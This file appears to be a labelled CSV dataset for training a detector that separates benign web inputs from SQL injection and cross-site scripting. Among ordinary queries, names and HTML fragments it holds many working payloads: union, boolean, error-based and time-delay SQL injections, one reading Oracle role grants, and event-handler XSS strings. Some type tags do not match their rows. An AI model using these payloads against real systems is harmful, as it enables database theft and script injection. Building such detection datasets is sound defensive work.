Text,Label,type
-4758%'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',1,xss
espaldilla,0,sql
SELECT WEEK ( CURDATE (   )  )  ;,0,sql
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",2,xss
SELECT * FROM whole ORDER BY night DESC,0,sql
SELECT * FROM Products WHERE ProductName NOT BETWEEN 'Carnarvon Tigers' AND 'Mozzarella di Giovanni' ORDER BY ProductName;,0,sql
 </li>,0,xss
"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
breceda perdig,0,sql
SELECT shallow ( s )  FROM label LEFT JOIN,0,xss
SELECT * FROM write,0,sql
"ruiz de alda, 78",0,sql
10702,0,sql
SELECT AVG ( fruit ) FROM cream,0,sql
"<menu draggable=""true"" ondragleave=""alert(1)"">test</menu>",2,xss
 ,0,xss
"<meter onmouseleave=""alert(1)"">test</meter>",2,xss
"<li><a href=""/wiki/Biocybernetics"" title=""Biocybernetics"">Biological cybernetics </a> </li>",0,xss
jelisic@sevach.pf,0,xss
"<del onmouseleave=""alert(1)"">test</del>",2,xss
graff@manzanilladevillafafila.iq,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/link-extractors.html"">Link Extractors</a></li>",0,xss
aira vials,0,sql
<audio onpointerleave=alert(1)>XSS</audio>,2,xss
SELECT AVG ( source ) FROM these,0,sql
select   (  case when   (  7217  =  7631  )   then 7217 else 7217*  (  select 7217 from information_schema.character_sets  )   end  )  #,1,sql
"<dt><a class=""reference internal"" href=""topics/architecture.html""><span class=""doc"">Architecture overview",0,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;204–233, </li>",0,xss
<figcaption onpointerup=alert(1)>XSS</figcaption>,2,xss
"-1277""  )   where 6622  =  6622 or 3038  =  3038",1,sql
toro,0,sql
"-9451%""  )   union all select 9963,9963,9963--",1,sql
SELECT * FROM monkey WHERE NOT total = 'excellent'  AND NOT hundred = 'actual',0,xss
fl5ct499t1,0,xss
"<li id=""cite_note-Learning_in_neural_networks-238""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Learning_in_neural_networks_238-0"">^ </a> </b> ",0,xss
"SELECT INSTR ( ""W3Schools.com"", ""COM"" )  AS MatchPosition;",0,sql
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",2,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/practices.html"">Common Practices</a></li>",0,xss
1' in boolean mode  )   and 3787  =  7750--,1,sql
<svg><area onload=alert(1)></area>,2,xss
abia de la obispala,0,sql
"<noframes draggable=""true"" ondragleave=""alert(1)"">test</noframes>",2,xss
SELECT * FROM almost WHERE substance = 'garage' FETCH FIRST 3 ROWS ONLY,0,sql
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",1,sql
"linares, 42",0,xss
1'  )   rlike sleep  (  5  )  #,1,sql
halpin,0,sql
SELECT * FROM  ( SELECT verb FROM occasionally ) ,0,sql
03291016s,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/Charles_T._Rubin"" title=""Charles T. Rubin"">Rubin, Charles </a> (Spring 2003). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20120611115223/http://www.thenewatlantis.com/publications/artificial-intelligence-and-human-nature"">""Artificial Intelligence and Human Nature"" </a>. <i>The New Atlantis </i>. <b>1 </b>: 88–100. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.thenewatlantis.com/publications/artificial-intelligence-and-human-nature"">the original </a> on 11 June 2012. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+Atlantis&amp;rft.atitle=Artificial+Intelligence+and+Human+Nature&amp;rft.ssn=spring&amp;rft.volume=1&amp;rft.pages=88-100&amp;rft.date=2003&amp;rft.aulast=Rubin&amp;rft.aufirst=Charles&amp;rft_id=http%3A%2F%2Fwww.thenewatlantis.com%2Fpublications%2Fartificial-intelligence-and-human-nature&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
 (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,1,xss
<br id=x tabindex=1 onfocus=alert(1)></br>,2,xss
	 </span> ,0,xss
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationstart=""alert(1)""></meta>",2,xss
17463,0,sql
85744372g,0,sql
	 </span> </li>,0,xss
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh",1,sql
yoselie,0,xss
SELECT AVG ( heat )  FROM on  SELECT SUM ( ancient ) ,0,sql
9334,0,sql
kenta1,0,sql
" SELECT * FROM joy ORDER BY afraid ASC, mathematics DESC",0,xss
b3m85rd493,0,xss
-3846%' or 6872  =  6872 and '%'  =  ',1,sql
end--,1,sql
"<dt><a class=""reference internal"" href=""topics/autothrottle.html""><span class=""doc"">AutoThrottle extension",0,xss
SELECT * FROM bread WHERE bit = 'whom' LIMIT 3,0,sql
"1'+  (  select sfmz where 4870  =  4870 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",1,sql
"1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"<li><a href=""/wiki/Millipede_memory"" title=""Millipede memory"">Millipede </a> </li>",0,xss
granach@mccomptables.be,0,sql
<aside onpointermove=alert(1)>XSS</aside>,2,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c87dd67714' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
3sc8r4a8anada,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<ol><li>If someone has a ""threat"" (that is, two in a row), take the remaining square. Otherwise, </li>",0,xss
"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"-1692'  )   union all select 7074,7074,7074,7074,7074,7074,7074#",1,sql
walker,0,sql
	 </span> 2019 ,0,xss
-2432'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'ejhp'  =  'ejhp,1,sql
"  SELECT forgot,becoming,health FROM bag LEFT JOIN Orders ON island.experienceID =  cast.keep ORDER BY dream.reach",0,sql
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",1,xss
SELECT * FROM verb,0,xss
-7230'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'khtc'  =  'khtc,1,sql
beln,0,sql
"""^""",1,sql
<xmp onpointerleave=alert(1)>XSS</xmp>,2,xss
SELECT Count ( * )  AS office,0,xss
"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",1,sql
SELECT pass FROM rise,0,sql
blakley@asyra.ao,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em""><a href=""/wiki/Category:Metatheory_of_science"" title=""Category:Metatheory of science"">Metatheory<br />of science </a> </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0,xss
SELECT * FROM made WHERE who = 'private'  OR driven = 'upper',0,xss
<label id=x tabindex=1 onactivate=alert(1)></label>,2,xss
67663365x,0,sql
corulln,0,sql
acu7ntiar,0,sql
SELECT * FROM courage WHERE method = 'tobacco'  AND  ( wonderful = 'tool' OR best = 'laid' ) ,0,sql
056cun95v08ac497,0,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,sql
SELECT * FROM frame WHERE afternoon = 'rest'  AND City = 'bow',0,sql
<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>,2,xss
"<ul><li><a href=""/wiki/Computer_architecture"" title=""Computer architecture"">Computer architecture </a> </li>",0,xss
"1%'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",1,xss
"		<li id=""footer-places-disclaimer""><a href=""/wiki/Wikipedia:General_disclaimer"" title=""Wikipedia:General disclaimer"">Disclaimers </a> </li>",0,xss
"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194,1,sql
" SELECT * FROM manner ORDER BY ten ASC, winter DESC",0,sql
SELECT grabbed ( s )  FROM moon,0,sql
"<tfoot onmousedown=""alert(1)"">test</tfoot>",2,xss
	 </span> </a> </li>,0,xss
229669a3a,0,sql
-7659'  )   as bowy where 4835  =  4835 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,sql
3.61612E+15,0,sql
omen@meneamex.sh,0,sql
<ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>,2,xss
"1%'   )    )     )   union all select null,null,null,null,null#",1,sql
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'yqzg'  =  'yqzg",1,sql
	 </span> </h4>,0,xss
"1' and make_set  (  2942  =  8200,8200  )   and 'jnhv' like 'jnhv",1,sql
"   SELECT COUNT ( studying ) , program FROM score BY former",0,sql
"<col onmouseup=""alert(1)"">test</col>",2,xss
 ,0,xss
cubillos del sil,0,xss
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",1,sql
 UPDATE shells SET shop = 'serious'WHERE loss = 'process',0,sql
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,2,xss
"<li id=""cite_note-339""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-339"">^ </a> </b> ",0,xss
"1'   )    )    as kxek where 3429  =  3429 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"<ul><li><a href=""/wiki/Technological_unemployment"" title=""Technological unemployment"">Technological unemployment </a> </li>",0,xss
32621,0,sql
76,0,sql
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'kmjn'  =  'kmjn",1,sql
lerma genis,0,sql
91512497m,0,xss
handler,1,sql
SELECT COUNT ( headed )  FROM never,0,sql
	 </span> ,0,xss
"<frame onkeydown=""alert(1)"" contenteditable>test</frame>",2,xss
"	 </span> <span class=""reference-text"">",0,xss
SELECT * FROM notice WHERE exact BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT * FROM anyone 3 SELECT * FROM base,0,xss
<svg><noframes onload=alert(1)></noframes>,2,xss
<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>,2,xss
"<style>:target {transform: rotate(180deg);}</style><bdi id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></bdi>",2,xss
SELECT TOP 3 * FROM track SELECT * FROM pour 3SELECT * FROM lips,0,sql
"-6112""  )   union all select 8203,8203,8203,8203,8203,8203,8203--",1,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Machine_learning"" title=""Machine learning"">Machine learning </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT * FROM anywhere WHERE am = 'everything'  OR bigger = 'dropped',0,sql
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationstart=""alert(1)""></listing>",2,xss
SELECT * FROM symbol WHERE breakfast IN  ( SELECT property FROM invented ) ,0,sql
"<style>:target {color: red;}</style><object id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></object>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation news"">Sample, Ian (18 October 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/science/2017/oct/18/its-able-to-create-knowledge-itself-google-unveils-ai-learns-all-on-its-own"">""<span class=""cs1-kern-left"">' ",0,xss
"  SELECT are AS rod, fence AS [worker]  FROM swung",0,xss
"  SELECT stairs AS cool, arrangement AS [truth]  FROM forget",0,sql
47185,0,sql
SELECT * FROM border FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<li id=""cite_note-384""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-384"">^ </a> </b> ",0,xss
"<li><a href=""/wiki/Information_theory"" title=""Information theory"">Information theory </a> </li>",0,xss
SELECT * FROM consider WHERE bone IN  ( SELECT walk FROM down ) ,0,sql
v2e2udo,0,sql
"1',  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",1,sql
27915,0,sql
 </ul>,0,xss
"<rt onkeyup=""alert(1)"" contenteditable>test</rt>",2,xss
SELECT * FROM verb WHERE what NOT LIKE 'grandfather%',0,xss
"		<a href=""#cite_note-FOOTNOTEEdelson1991-141"">&#91;138&#93; </a> </sup>",0,xss
"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",1,xss
"<u onkeypress=""alert(1)"" contenteditable>test</u>",2,xss
"  SELECT protectionID AS ID, conversation AS plural FROM imagine",0,sql
"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""ieuj"" like ""ieuj",1,sql
</dl>,0,xss
SELECT vegetable ( s )  FROM solar LEFT JOIN,0,sql
 ,0,xss
1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,1,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,1,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
"<dialog onmouseleave=""alert(1)"">test</dialog>",2,xss
"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",1,sql
disney,0,sql
SELECT * FROM neck WHERE when = 'how' FETCH FIRST 3 ROWS ONLY,0,sql
delvalle llers,0,sql
	 </span> </h3>,0,xss
"1"" or sleep  (  5  )  #",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
mohandas,0,sql
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'uvlu'  =  'uvlu",1,sql
"  SELECT * FROM doctor WHERE adventure IN  ( 'stuck', 'pull', 'title' )  ",0,sql
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""weku"" like ""weku",1,sql
SELECT Count ( * )  AS year,0,sql
"-6118 union all select 5906,5906,5906,5906,5906#",1,sql
	 </span>,0,xss
tornos,0,xss
lacasse,0,xss
 </li>,0,xss
"  SELECT * FROM black WHERE paint NOT IN  ( 'visitor', 'swim', 'raise' )  ",0,sql
-1549'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'fnwx'  =  'fnwx,1,sql
"<map onkeypress=""alert(1)"" contenteditable>test</map>",2,xss
SELECT COUNT ( improve )  FROM laugh,0,sql
"-9392   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   2975  =  2975",1,sql
"1"" where 8727  =  8727",1,sql
"<style>@keyframes x{}</style><button style=""animation-name:x"" onanimationstart=""alert(1)""></button>",2,xss
"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
SELECT TOP 3 * FROM wire WHERE theory = 'become',0,sql
" SELECT * FROM police ORDER BY forward ASC, than DESC",0,sql
SELECT TOP 50 PERCENT * FROM church,0,sql
"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",1,xss
tomolillo@velazquezlarranaga.et,0,sql
<form onsubmit=alert(1)><input type=submit>,2,xss
"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",1,sql
"<col oncut=""alert(1)"" contenteditable>test</col>",2,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/asyncio.html"">asyncio</a></li>",0,xss
 </p>,0,xss
SELECT * FROM are FETCH FIRST 3 ROWS ONLY,0,sql
 </li>,0,xss
SELECT * FROM wp_posts WHERE ID  =  262329 LIMIT 1,0,sql
"INSERT INTO more  ( relationship, why, hand )  VALUES  ( 'empty', 'expect', 'war' )  ",0,sql
candelario,0,sql
faix,0,sql
tuneu,0,sql
"calle ter, 20,",0,xss
SELECT TOP 3 * FROM twenty WHERE word = 'research',0,xss
1%'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',1,sql
	 </span></p>,0,xss
"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,xss
